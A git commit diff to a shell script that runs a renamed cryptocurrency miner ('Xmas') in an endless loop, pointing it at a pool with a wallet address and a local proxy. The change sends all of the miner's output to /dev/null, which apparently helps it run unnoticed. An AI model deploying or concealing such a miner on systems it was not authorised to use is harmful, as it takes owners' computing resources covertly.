92a63e08ba43f43081d5e7d255128190f3213906
mthuthuzelimagqenene <mthuthuzelimagqenene@gmail.com>
2025-03-12 03:49:32 +0200

    Update start_Xmas_bitr_veil.sh

--- start_Xmas_bitr_veil.sh
+++ start_Xmas_bitr_veil.sh
@@ -93,6 +93,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10281 -u solo:bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p x --rig-id=$currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10281 -u solo:bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p x --rig-id=$currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
